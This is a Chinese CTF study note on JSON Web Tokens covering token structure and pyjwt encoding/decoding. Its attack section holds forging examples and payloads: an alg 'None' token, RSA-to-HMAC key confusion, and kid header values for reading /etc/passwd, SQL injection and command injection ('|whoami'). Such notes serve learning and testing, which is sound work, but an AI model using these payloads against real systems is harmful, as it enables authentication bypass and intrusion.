---
title: 'jwt学习笔记'
date: 2020-03-10
updated: 2020-03-19
category: 'CTF'
tags:
  - 'jwt'
lang: 'zh'
draft: false
---
## 基本概念

JWT的全称是Json Web Token。它遵循JSON格式，将用户信息加密到token里，服务器不保存任何用户信息，只保存密钥信息，通过使用特定加密算法验证token，通过token验证用户身份。基于token的身份验证可以替代传统的cookie+session身份验证方法。

jwt由三个部分组成

```
header.payload.signature
```

首先看 `header`

`alg` 指定了token加密使用的算法（最常用的为**HMAC**和**RSA**算法

HMAC：对称

RSA：非对称

> HASH: 压缩
> 
> MAC: 带密钥的hash
> 
> HMAC: MAC的一种

```
{
        "alg" : "HS256",
        "typ" : "jwt"
}
```

`payload`

相关的数据：

```
{
    "user_role" : "finn",    //当前登录用户
    "iss": "admin",          //该JWT的签发者
    "iat": 1573440582,        //签发时间
    "exp": 1573940267,        //过期时间
    "nbf": 1573440582,         //该时间之前不接收处理该Token
    "domain": "example.com",   //面向的用户
    "jti": "dff4214121e83057655e10bd9751d657"   //Token唯一标识
}
```

`signature` ,保护token完整性

```
signature = HMAC-SHA256(base64urlEncode(header) + '.' + base64urlEncode(payload), secret_key)
```

## pyjwt

（注意是必须 pip install pyjwt

```
In [1]: import jwt

In [2]: encoded_jwt = jwt.encode({'user_name': 'admin'}, 'key', algorithm='HS256')

In [3]: encoded_jwt
Out[3]: b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX25hbWUiOiJhZG1pbiJ9.fN_uBYJZuGWi_XnqKe_HDo6EYBU8Te1nanJRBnpnPns'
```

[https://jwt.io/](https://jwt.io/) 解密

可以看到并不需要key也可以直接解密，有点像flask 的session

![](./attachments/1584601836858.png)

解密

```
In [4]: print(jwt.decode(encoded_jwt, 'key', algorithms=['HS256']))
{'user_name': 'admin'}
```

## 攻击方式

### 空加密算法

JWT支持使用空加密算法，可以在header中指定alg为`None`

pyjwt生成空加密算法的jwt

```python
In [10]: encoded_jwt = jwt.encode({'user_name': 'admin'}, 'key', headers={"alg":"None", "typ":"jwt"})

In [11]: encoded_jwt
Out[11]: b'eyJ0eXAiOiJqd3QiLCJhbGciOiJOb25lIn0.eyJ1c2VyX25hbWUiOiJhZG1pbiJ9.73u0KBesnvDB-k3jhmyzzPnExs8gUsxaYG2MBtBeNtg'
```

![](./attachments/1584602118605.png)

### 修改加密算法RSA为HMAC(未尝试)

理论：

一个Web应用，在JWT传输过程中使用RSA算法，密钥`pem`对JWT token进行签名，公钥`pub`对签名进行验证。

通常情况下密钥`pem`是无法获取到的，但是公钥`pub`却可以很容易通过某些途径读取到，这时，将JWT的加密算法修改为HMAC

```
{
    "alg" : "HS256",
    "typ" : "jwt"
}
```

同时使用公钥pub作为密钥，这样服务端接收到的数据就会用HMAC的方式来验证了

### 爆破密钥

[c-jwt-cracker](https://github.com/brendan-rius/c-jwt-cracker)了解一下

### 修改kid参数

用来指定私钥位置，也可以修改？

```
{
    "alg" : "HS256",
    "typ" : "jwt",
    "kid" : "/home/jwt/.ssh/pem"
}
```

### 任意文件读取？(有点骚)

```
{
    "alg" : "HS256",
    "typ" : "jwt",
    "kid" : "/etc/passwd"
}
```

### SQL注入

```
{
    "alg" : "HS256",
    "typ" : "jwt",
    "kid" : "key11111111' || union select 'secretkey' -- "
}
```

### 命令注入

```
"/path/to/key_file|whoami"
```

## 参考

[jwt安全问题](https://xz.aliyun.com/t/6776#toc-4)
